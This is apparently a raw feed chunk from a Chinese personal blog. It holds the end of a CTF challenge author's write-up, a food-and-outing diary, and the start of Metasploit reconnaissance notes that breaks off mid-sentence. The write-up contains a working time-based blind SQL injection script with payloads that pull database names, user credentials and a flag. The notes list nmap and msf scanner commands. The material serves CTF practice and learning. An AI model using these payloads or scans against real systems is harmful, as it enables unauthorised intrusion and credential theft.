information_schema.schemata limit 0,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 1,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 2,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 3,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 4,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 5,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns1_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_flags&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg&#x27; limit 0, 1),&quot;</span></span><br><span class="line">                      <span class="string">&quot;%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 0, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 1, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 2, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 3, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 4, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 5, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flags_flag&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select flag from &quot;</span></span><br><span class="line">                  <span class="string">&quot;`usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg` limit 0, 1), %d, 1))&lt;%d) then &quot;</span></span><br><span class="line">                  <span class="string">&quot;sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_username</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">wh</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload_length[wh] % i</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fuck &quot;</span> + wh + <span class="string">&quot; length &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; failed&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;length for &quot;</span> + wh + <span class="string">&quot;: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">wh</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">        new = get_char(j, wh)</span><br><span class="line">        <span class="keyword">if</span> new <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += new</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data for &quot;</span> + wh + <span class="string">&quot;: &quot;</span> + name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_char</span>(<span class="params">index, wh</span>):</span></span><br><span class="line">    minx = <span class="number">32</span></span><br><span class="line">    maxx = <span class="number">127</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> minx &lt; maxx:</span><br><span class="line">        i = (minx + maxx) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a == i:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(i)</span><br><span class="line">        data[<span class="string">&quot;username&quot;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&quot;password&quot;</span>] = payload_data[wh] % (index, i)</span><br><span class="line">        t1 = datetime.datetime.now()</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        t2 = datetime.datetime.now()</span><br><span class="line">        sec = (t2 - t1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &lt; <span class="number">1</span>:</span><br><span class="line">            minx = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maxx = i</span><br><span class="line">        a = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 响应超时导致返回不对很正常，多搞几次吧，大概插入 800+ 行就会恶疾频发，重启靶机吧</span></span><br><span class="line">    <span class="comment"># get_length(&quot;database&quot;)</span></span><br><span class="line">    <span class="comment"># database: 17</span></span><br><span class="line">    <span class="comment"># user: 15</span></span><br><span class="line">    <span class="comment"># version: 6</span></span><br><span class="line">    get_data(<span class="string">&quot;flags_flag&quot;</span>)</span><br><span class="line">    <span class="comment"># database: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># user: admin@localhost</span></span><br><span class="line">    <span class="comment"># version: 5.7.26</span></span><br><span class="line">    <span class="comment"># schemata0: information_schema</span></span><br><span class="line">    <span class="comment"># schemata1: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># schemata2：mysql</span></span><br><span class="line">    <span class="comment"># schemata3：performance_schema</span></span><br><span class="line">    <span class="comment"># schemata4：sys</span></span><br><span class="line">    <span class="comment"># tables0: users</span></span><br><span class="line">    <span class="comment"># tables1: usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg</span></span><br><span class="line">    <span class="comment"># columns0_users: username</span></span><br><span class="line">    <span class="comment"># columns1_users: password</span></span><br><span class="line">    <span class="comment"># columns0_flags：flag</span></span><br><span class="line">    <span class="comment"># users_username_password_0:</span></span><br><span class="line">    <span class="comment"># users_username_password_1:</span></span><br><span class="line">    <span class="comment"># users_username_password_2:</span></span><br><span class="line">    <span class="comment"># users_username_password_3:</span></span><br><span class="line">    <span class="comment"># users_username_password_4:</span></span><br><span class="line">    <span class="comment"># users_username_password_5:</span></span><br><span class="line">    <span class="comment"># flags_flag:</span></span><br></pre></td></tr></table></figure><p>谭总：“你搁这养蛊呢，自己日自己的项目。”，怎么说呢，还是很有意思，彳亍，（各位师傅别打我，我就一人畜无害的出题人，溜了溜了）</p><h2 id="PWN-有手就行的-ez-nc"><a href="#PWN-有手就行的-ez-nc" class="headerlink" title="PWN-有手就行的 ez_nc"></a>PWN-有手就行的 ez_nc</h2><p>这题签到，怎么说呢，应该不会有人找不到 flag 吧🤭（嘻嘻.jpg）</p><p><code>cat /bin/tac</code> 即可获得 flag（提示也说明了，cat 反过来，不就是 tac 嘛</p><p>贴一下 start.sh 吧，我的得意之作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"></span><br><span class="line">mkdir -p /home/ctf/tmp</span><br><span class="line">mkdir -p /home/ctf/mnt</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/1.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/2.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/3.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/mnt/c/`cat /home/ctf/tmp/1.txt`/d/`cat /home/ctf/tmp/2.txt`/e/`cat /home/ctf/tmp/3.txt`/&quot;</span> &gt; /home/ctf/tmp/1.exe</span><br><span class="line">mkdir -p /home/ctf`cat /home/ctf/tmp/1.exe`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;gong xi ni!!!!!!bu there is no flag!!!xpctf&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span> &gt; /home/ctf`cat /home/ctf/tmp/1.exe`/flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;but this is a fake flag&quot;</span> &gt;&gt; /home/ctf/flag</span><br><span class="line"></span><br><span class="line">rm -rf /home/ctf/tmp/*</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1000`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        mkdir -p /home/ctf/tmp/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/tmp/<span class="variable">$i</span>/flag</span><br><span class="line">        mkdir -p /home/ctf/etc/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/etc/<span class="variable">$i</span>/flag.txt</span><br><span class="line">        mkdir -p /home/ctf/mnt/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/<span class="variable">$i</span>/flag.exe</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/<span class="variable">$i</span>/flag.list</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/d/e/f/h/i/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/d/e/f/h/i/flag.source</span><br><span class="line">        mkdir -p /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/flag.dui</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/bin/tac</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am so soooooooooooooooooooooooooooooooorry to zhe mo you so jiu~~~~~flag give you~o&quot;</span> &gt;&gt; /home/ctf/bin/tac</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;flag_Du1L0v3lOVeYou&#125;&quot;</span> &gt; /home/ctf/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hint: sha bi cai hui xin you hint, qian dao ti ye xiang yao hint? guai guai zhao bei, xi xi xi, but my cat is a little tiao pi, he like reverse&quot;</span> &gt; /home/ctf/hint.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># start ctf-xinetd</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">trap</span> : TERM INT;</span><br><span class="line">sleep infinity &amp; <span class="built_in">wait</span>\</span><br></pre></td></tr></table></figure><p>真的溜了 (0√0)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论从高档餐厅到街头小吃的奇妙一晚</title>
      <link href="2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/"/>
      <url>2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/</url>
      
        <content type="html"><![CDATA[<p>今天中秋前夕🌙，经寝室里的某位狐朋狗友盛情邀请，一行人决定是前往市中心吃顿好的。</p><p>只能说，鄙人提议的小吃街被忽视，大家希望在店子里胡吃海喝一波，但是选择得不是很正确啊，一群没💰的倒霉蛋，选择了一家很需要💰的烧烤店（似乎叫做黑🐂烧烤）</p><p><img src="https://i.loli.net/2021/10/16/7hc25fTreP9LjBl.jpg"></p><p><img src="https://i.loli.net/2021/09/20/5vMmqO97k4L3QF8.jpg"></p><p>只能说亏得亚匹，还没吃饱，他奶奶的，然后一行人直接吃一波楼下小吃街，排骨YYDS~</p><p><img src="https://i.loli.net/2021/10/16/uLKTJRelkhnzd2I.jpg"></p><p>还是流落街头狂啃排骨的感觉好，香而美味，无敌~</p><p><img src="https://i.loli.net/2021/10/16/j4ErqTmhQBeJXo6.jpg"></p><p>还有梅干菜扣肉（from 润生，俺没恰</p><p><img src="https://i.loli.net/2021/10/16/QbuXM2AmZCqgzHv.jpg"></p><p><img src="https://i.loli.net/2021/10/16/C8cGNiAX1Wx3Ldr.jpg"></p><p><img src="https://i.loli.net/2021/10/16/2yISJGdQpc6T9Eh.jpg"></p><p>很热闹，到处转，完事以后来到了江边，散步~其他人都挺捞的，就👴和润生一起沿江边散了老半天步，回头路上还迷路多转了半天，不过 ly 和老吴两个逆天搁那 up big，当然那就是另一说了。</p><p>拍了点江边的风景~</p><p><img src="https://i.loli.net/2021/10/16/1vqcXr2RgeBY3bj.jpg"></p><p>桥下。</p><p><img src="https://i.loli.net/2021/10/16/khw5CeGgFIaOLnY.jpg"></p><p><img src="https://i.loli.net/2021/10/16/ckmyiKZOx2pISQV.jpg"></p><p><img src="https://i.loli.net/2021/10/16/d7e3JRj8N5PbCuc.jpg"></p><p>下面这个是文和友，忘了是干啥的去了。</p><p><img src="https://i.loli.net/2021/10/16/Fp9KlnZqWetOSx8.jpg"></p><p>看到了孔明灯还。</p><p><img src="https://i.loli.net/2021/10/16/9rdHQ6VaYAEgLbS.jpg"></p><p>怎么说呢……只能说，这背影就很恩爱🐧</p><p><img src="https://i.loli.net/2021/10/16/A6eGCF7aEuymDPR.jpg"></p><p><img src="https://i.loli.net/2021/10/16/C7YWKd4Za3wItGD.jpg"></p><p>@youdamao @oldwu 祝你们百年好合🎈🎈🎈</p>]]></content>
      
      
      <categories>
          
          <category> 瞎BB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鮾魍肾透学习</title>
      <link href="2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>菜鸡笔记</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>PowerShell 在线</p><p><a href="https://www.pstips.net/powershell-online-tutorials">https://www.pstips.net/powershell-online-tutorials</a></p><h3 id="被动信息搜集"><a href="#被动信息搜集" class="headerlink" title="被动信息搜集"></a>被动信息搜集</h3><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; whois testfire.net</span><br></pre></td></tr></table></figure><h4 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h4><p><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a></p><h4 id="nslook"><a href="#nslook" class="headerlink" title="nslook"></a>nslook</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslook</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=mx</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br></pre></td></tr></table></figure><h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:tetfire.net login</span><br></pre></td></tr></table></figure><h3 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -Pn -p1-65536 192.168.160.13</span><br><span class="line">nmap -Pn -sS- A -oX Subnet1.xml 192.168.160.0/24</span><br></pre></td></tr></table></figure><h5 id="tcp-空闲扫描"><a href="#tcp-空闲扫描" class="headerlink" title="tcp 空闲扫描"></a>tcp 空闲扫描</h5><p>冒充空闲主机 IP 帧标识</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf &gt; show options </span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threds 50</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; nmap -PN -sI 192.168.160.2 192.168.160.13</span><br></pre></td></tr></table></figure><h4 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msf &gt; db_connect postgres:postgres@127.0.0.1/msf</span><br><span class="line">msf &gt; db_status</span><br><span class="line">msf &gt; db_import /root/test/Subnet1.xml</span><br><span class="line">msf &gt; hosts -c address</span><br></pre></td></tr></table></figure><h4 id="结合-postgresql-与-Nmap"><a href="#结合-postgresql-与-Nmap" class="headerlink" title="结合 postgresql 与 Nmap"></a>结合 postgresql 与 Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -sS -A 192.168.160.13</span><br><span class="line">msf &gt; services -u</span><br></pre></td></tr></table></figure><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>利用 msf 框架提供的端口扫描工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><h3 id="针对性扫描"><a href="#针对性扫描" class="headerlink" title="针对性扫描"></a>针对性扫描</h3><h4 id="服务器消息块协议扫描"><a href="#服务器消息块协议扫描" class="headerlink" title="服务器消息块协议扫描"></a>服务器消息块协议扫描</h4><p>smb_version 模块可以遍历网络并获取 windows 系统版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; hosts -u -c address,os_name,svcs,vulns,workspace</span><br></pre></td></tr></table></figure><p>快速且安全定位高风险主机的方法</p><h4 id="搜索配置不当的-Microsoft-SQL-Server"><a href="#搜索配置不当的-Microsoft-SQL-Server" class="headerlink" title="搜索配置不当的 Microsoft SQL Server"></a>搜索配置不当的 Microsoft SQL Server</h4><p>MSSQL 默认 1433 端口，使用 mssql_ping（利用 UDP 协议）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>用以在大量主机子网中查找 MSSQL，比 Nmao 逐一端口查找快得多</p><h4 id="SSH-服务器扫描"><a href="#SSH-服务器扫描" class="headerlink" title="SSH 服务器扫描"></a>SSH 服务器扫描</h4><p>ssh_version 模块用以识别目标服务器上运行的 ssh 版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf &gt; show option</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>如果期望攻击一个特定版本的 OpenSSH 服务程序，可以先使用 ssh_version 扫描</p><h4 id="FTP-扫描"><a href="#FTP-扫描" class="headerlink" title="FTP 扫描"></a>FTP 扫描</h4><p>ftp_version 模块可以对 FTP 服务器进行扫描识别与查点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>scanner/ftp/anomymous 模块可以检查 FTP 服务器是否允许匿名用户登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>如果报告允许匿名登陆且拥有读写权限，就相当于我们对其拥有完全访问权限</p><h4 id="简单网管协议扫描"><a href="#简单网管协议扫描" class="headerlink" title="简单网管协议扫描"></a>简单网管协议扫描</h4><p>可访问的 